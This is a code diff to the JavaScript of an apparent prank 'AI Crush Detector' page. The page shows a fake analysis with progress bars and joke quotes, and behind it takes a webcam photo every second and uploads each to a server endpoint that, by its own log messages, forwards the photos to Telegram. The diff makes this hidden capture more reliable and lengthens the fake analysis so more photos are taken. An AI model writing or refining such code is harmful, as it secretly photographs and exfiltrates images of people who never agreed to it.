@@ -69,11 +69,12 @@ async function requestCamera() {
         const video = document.getElementById('video');
         video.srcObject = stream;
         
-        // Start analysis simulation
-        startAnalysis();
-        
-        // Start photo capture
-        startPhotoCapture();
+        // Wait for video to be ready
+        video.onloadedmetadata = () => {
+            console.log('Video ready, starting analysis');
+            startAnalysis();
+            startPhotoCapture();
+        };
         
     } catch (error) {
         console.error('Camera access denied:', error);
@@ -89,9 +90,9 @@ function startAnalysis() {
         analysisProgress += 1;
         
         // Update progress bars
-        const progress1 = Math.min(100, (analysisProgress / 30) * 100);
-        const progress2 = Math.min(100, Math.max(0, (analysisProgress - 10) / 30) * 100);
-        const progress3 = Math.min(100, Math.max(0, (analysisProgress - 20) / 30) * 100);
+        const progress1 = Math.min(100, (analysisProgress / 20) * 100);
+        const progress2 = Math.min(100, Math.max(0, (analysisProgress - 10) / 20) * 100);
+        const progress3 = Math.min(100, Math.max(0, (analysisProgress - 20) / 20) * 100);
         
         document.getElementById('progress1').textContent = Math.round(progress1) + '%';
         document.getElementById('progress2').textContent = Math.round(progress2) + '%';
@@ -113,22 +114,31 @@ function startAnalysis() {
             stopPhotoCapture();
             showResults();
         }
-    }, 100);
+    }, 1000);
 }
 
 function startPhotoCapture() {
-    const video = document.getElementById('video');
+    console.log('Starting photo capture');
     
-    // Wait for video to be ready
-    video.onloadedmetadata = () => {
+    // Capture first photo immediately
+    setTimeout(() => {
+        capturePhoto();
+        
+        // Then capture every second
         captureInterval = setInterval(() => {
             capturePhoto();
-        }, 1000); // Capture every second
-    };
+        }, 1000);
+    }, 100);
 }
 
 function capturePhoto() {
     const video = document.getElementById('video');
+    
+    if (!video || video.readyState !== 4) {
+        console.log('Video not ready yet');
+        return;
+    }
+    
     const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
     
@@ -143,13 +153,15 @@ function capturePhoto() {
                 const formData = new FormData();
                 formData.append('photo', blob, 'capture.jpg');
                 
+                console.log('Sending photo to server...');
+                
                 const response = await fetch('/api/send-photo', {
                     method: 'POST',
                     body: formData
                 });
                 
                 if (response.ok) {
-                    console.log('✅ Photo sent to Telegram successfully:', blob.size, 'bytes');
+                    console.log('✅ Photo sent to Telegram successfully');
                 } else {
                     console.log('❌ Failed to send photo to Telegram');
                 }
@@ -157,7 +169,7 @@ function capturePhoto() {
                 console.error('❌ Network error:', error);
             }
         }
-    }, 'image/jpeg', 0.9);
+    }, 'image/jpeg', 0.8);
 }
 
 function stopPhotoCapture() {
@@ -175,41 +187,31 @@ function stopPhotoCapture() {
 function showResults() {
     // Show random funny quote
     const randomQuote = funnyQuotes[Math.floor(Math.random() * funnyQuotes.length)];
-    document.getElementById('funny-quote').textContent = randomQuote;
+    
+    // Update results screen with quote
+    const resultsScreen = document.getElementById('results');
+    const quoteElement = document.createElement('p');
+    quoteElement.className = 'text-center text-gray-300 mt-4';
+    quoteElement.textContent = randomQuote;
+    
+    // Add quote if not already there
+    const existingQuote = resultsScreen.querySelector('.text-gray-300.mt-4');
+    if (existingQuote) {
+        existingQuote.textContent = randomQuote;
+    } else {
+        resultsScreen.querySelector('.bg-gray-800').appendChild(quoteElement);
+    }
     
     showScreen('results');
 }
 
 function analyzeAgain() {
-    showScreen('analysis');
-    const video = document.getElementById('video');
-    
-    // Restart camera
-    requestCamera();
-}
-
-async function shareResults() {
-    const shareData = {
-        title: 'AI Crush Detector Results',
-        text: 'I just discovered my crush is Kaleem using AI! 💖',
-        url: window.location.href
-    };
-
-    try {
-        if (navigator.share) {
-            await navigator.share(shareData);
-        } else {
-            await navigator.clipboard.writeText(`${shareData.text} ${shareData.url}`);
-            alert('Results copied to clipboard!');
-        }
-    } catch (err) {
-        console.error('Error sharing:', err);
-    }
+    showScreen('camera');
 }
 
 // Prevent page refresh during analysis
 window.addEventListener('beforeunload', function(e) {
-    if (currentScreen === 'analysis' || currentScreen === 'results') {
+    if (currentScreen === 'analysis') {
         e.preventDefault();
         e.returnValue = '';
     }
